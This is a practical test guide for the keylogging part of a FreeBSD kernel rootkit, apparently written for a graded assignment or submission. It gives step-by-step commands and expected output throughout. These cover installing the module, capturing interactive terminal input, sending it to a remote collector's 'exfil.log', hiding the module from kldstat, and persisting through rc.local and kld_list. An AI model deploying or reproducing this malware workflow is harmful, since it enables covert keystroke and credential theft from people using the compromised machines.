# LOG feature — test guide

Practical, copy-pasteable instructions for whoever validates the logging part.

---

## 0. What counts as "passing"

The grader wants exactly one thing: **run `./log <TARGET_IP>` on REMOTE, type on TARGET, and the file written on REMOTE contains what was typed.**

Three conditions, all required:

1. On TARGET: `/dev/rootkit` exists, `rklog` is running, `sysctl kern.rootkit` returns counters.
2. On REMOTE: the log file grows with lines shaped like `[t=1794123514.934470 pid=1145 uid=0] ls -l /etc/motd`.
3. One typed command produces exactly one line, and **piped / redirected data never shows up**.

---

## 1. Roles and prerequisites

| Role | What it is | Requirements |
|---|---|---|
| **TARGET** | The FreeBSD 14.5 box that gets the rootkit | none beyond the unpacked tarball |
| **REMOTE** | The collector box that runs `./log` | any Unix (FreeBSD / Linux / macOS) with a **C compiler** (`cc` or `clang`), because `./log` compiles the collector on first run |

Both machines must reach each other on TCP **9999** (default port — if you change it, change it on both sides).

Unpack the submission:

```sh
tar -xf rootkit.tar          # create_submission_tarball writes an uncompressed archive
ls    # install  elevate  log  remote  kernel/  user/  logsrc/  detector/ ...
chmod +x install elevate log remote 2>/dev/null || true   # some extractors drop the exec bit
```

> `log` is a shell wrapper, not a prebuilt binary: every run compiles `logsrc/collector.c`. REMOTE therefore cannot be missing `cc`.

---

## 2. Five-minute smoke test (shortest path)

### Step 1 — start the collector on REMOTE

```sh
# on REMOTE; <TARGET_IP> is TARGET's address
./log <TARGET_IP>
```

Expected, printed immediately, then it waits:

```
collector: port 9999, any peer, appending to exfil.log
```

> Different port or file: `./log <TARGET_IP> 9999 /tmp/mylog.txt`

### Step 2 — install on TARGET

```sh
# on TARGET, as root; <REMOTE_IP> is REMOTE's address
cd /root/work        # wherever the tarball was unpacked
./install <REMOTE_IP>
```

Expected tail:

```
rootkit.ko installed to /boot/modules/rootkit.ko
rklog started (collector <REMOTE_IP>:9999)
```

The installer writes `rklog` into `/etc/rc.local`, so it reconnects after every reboot without manual steps.

### Step 3 — self-check on TARGET

```sh
ls -l /dev/rootkit          # crw-rw-rw- ... rootkit
pgrep -af rklog             # /usr/local/bin/rklog <REMOTE_IP> 9999 -d
sysctl kern.rootkit
```

Expected:

```
kern.rootkit.bytes: 0
kern.rootkit.entries: 0
kern.rootkit.dropped: 0
kern.rootkit.log_pipes: 0
kern.rootkit.log_stdout: 0
kern.rootkit.fd0_debug: 0
```

If `pgrep` prints nothing, check `sockstat -4 | grep 9999` first, then see section 6.

### Step 4 — generate keystrokes

**You need an interactive terminal** — this is the step people get wrong. Either:

- SSH into TARGET with a pty: `ssh root@<TARGET_IP>`, then type at the prompt, or
- log in on TARGET's console / VM window and type there.

```sh
echo TTY_ALPHA_111
ls -l /etc/motd
```

### Step 5 — look at the result

On REMOTE:

```sh
tail -f exfil.log
```

Expected — one line per command, timestamp is TARGET's unix time, pid is the shell that ran it:

```
[t=1794123514.934470 pid=1145 uid=0] echo TTY_ALPHA_111
[t=1794123518.937944 pid=1145 uid=0] ls -l /etc/motd
```

REMOTE's terminal also prints:

```
sender 127.0.0.1 connected
```

> `127.0.0.1` is normal: behind NAT or QEMU slirp the source address is rewritten. The collector accepts any peer by default (it prints `note: ... logging anyway`); only `-f` makes it strict. **Seeing 127.0.0.1 is not a bug.**

At this point the log feature has passed.

---

## 3. Full acceptance checklist

Run in order, keep the output of every step.

| # | Where | Action | Expected |
|---|---|---|---|
| 1 | TARGET | `./install <REMOTE_IP>` | exit code 0; `/dev/rootkit` present; `/usr/local/bin/rklog` present |
| 2 | TARGET | `sysrc kld_list` | contains `rootkit` (autoload on boot) |
| 3 | TARGET | `cat /etc/rc.local` | contains `/usr/local/bin/rklog <REMOTE_IP> 9999 -d` |
| 4 | REMOTE | `./log <TARGET_IP>` | prints `collector: port 9999, any peer, ...` |
| 5 | TARGET | type 3 commands in an interactive SSH session | REMOTE log shows 3 lines matching what was typed |
| 6 | TARGET | `sysctl kern.rootkit` | `entries` increased, `dropped` stays 0, `fd0_debug` ends in `1` (e.g. `66561`) |
| 7 | TARGET | `printf 'X\n' \| cat` | log does **not** grow, `entries` unchanged, `fd0_debug` becomes `196608` |
| 8 | TARGET | `sysctl kern.rootkit.log_pipes=1`, repeat step 7 | this time the pipe content is captured (proves the hook is alive and only filtering) |
| 9 | TARGET | `sysctl kern.rootkit.log_pipes=0` | back to default — do not leave it at 1 |
| 10 | TARGET | `reboot`, log in again, type a command | logging continues: `kld_list` + `rc.local` persistence works |
| 11 | REMOTE | stop the collector, type a few commands, restart it | backlog is delivered after reconnect (spool); a few duplicated lines are the expected window |

---

## 4. Three ways to get a false negative

**① Feeding commands through a pipe instead of typing**

```sh
ssh root@TARGET 'echo test'      # wrong: no pty, stdin is a socket → not recorded by design
ssh -t root@TARGET               # right: allocates a pty → recorded
printf 'ls\n' | ssh root@TARGET  # wrong: same reason
```

Only "terminal reads" are captured (`fd 0` is a `VV_ISTTY` vnode or any character device: pty, console, `/dev/tty`). Pipes, sockets and regular files are skipped — that is what keeps `ls | cat` or an installer dumping 50 KB through a pipe from flushing the 64 KB ring. To capture pipes too: `sysctl kern.rootkit.log_pipes=1`.

**② Port mismatch**

Collector `./log <IP> 9999` and installer `./install <IP>` both default to 9999. If the install used `LOG_PORT=...`, the collector must use the same port.

**③ Expecting `kldstat` to show the module**

The installer runs `hide_kld` at the end, which unlinks `rootkit.ko` from the module list — `kldstat -m rootkit` printing nothing is the **intended** result. Check `/dev/rootkit`, `sysctl kern.rootkit`, `pgrep rklog` instead.

---

## 5. Observation points (paste these into the report)

On TARGET:

```sh
ls -l /dev/rootkit
pgrep -af rklog
sockstat -4 | grep -E 'rklog|9999'           # 10.x.x.x:xxxxx -> <REMOTE_IP>:9999
sysctl kern.rootkit
tail -20 /var/log/.rklog.spool 2>/dev/null   # backlog while disconnected; truncated after delivery
```

On REMOTE:

```sh
wc -l exfil.log
tail -5 exfil.log
```

`exfil.log` rotates to `exfil.log.1` at 8 MB, so long runs do not fill the disk.

---

## 6. Troubleshooting

| Symptom | Most likely cause | How to confirm / fix |
|---|---|---|
| REMOTE never prints anything, no `sender ... connected` | `rklog` not running on TARGET, or it cannot connect | On TARGET: `pgrep -af rklog`, `sockstat -4 \| grep 9999`; make sure `<REMOTE_IP>` is routable from TARGET |
| `rklog` runs but keeps printing `retry in 500ms` | port closed / REMOTE firewall | From TARGET: `nc -vz <REMOTE_IP> 9999`; confirm `./log` is still in the foreground on REMOTE |
| Connected but the log file stays empty | input came from a non-interactive ssh or a pipe | use `ssh -t` or the console; watch `sysctl kern.rootkit.entries` |
| `entries` grows but REMOTE receives nothing | port mismatch, or spool backlog | check `/var/log/.rklog.spool` size; verify both ports |
| `entries` never moves | hook not installed | `sysctl kern.rootkit` unreadable → module not loaded; `kldload /boot/modules/rootkit.ko` and read the error |
| `fd0_debug` is `0xdead....` | fd 0 lookup failed (stdin already closed) | harmless; retry with another command |
| `dropped` keeps growing | ring exhausted (e.g. `log_pipes` left on) | `sysctl kern.rootkit.log_pipes=0` |
| Machine panics after `kldunload rootkit` | **known upstream defect**, unrelated to logging | do not iterate with `kldunload`; replace the module via `cp rootkit.ko /boot/modules/` and reboot |
| Collector immediately prints `rejected ...` | `-f` was given while NAT rewrote the source address | drop `-f` |

---

## 7. Evidence collection (paste into the report)

TARGET:

```sh
{ uname -a
  ls -l /dev/rootkit
  pgrep -af rklog
  sysctl kern.rootkit
  sockstat -4 | grep 9999
} 2>&1 | tee /tmp/log-evidence-target.txt
```

REMOTE:

```sh
{ uname -a
  tail -10 exfil.log
  wc -l exfil.log
} 2>&1 | tee /tmp/log-evidence-remote.txt
```

Hand both files over together with a screenshot or recording of the interactive session.

---

## 8. One-sentence acceptance script

> On REMOTE: `chmod +x log && ./log <TARGET_IP>`. On TARGET: `./install <REMOTE_IP>`, then `ssh -t root@<TARGET_IP>` and type two commands — REMOTE's `exfil.log` shows both, one line each; piped input never appears; logging survives a reboot.
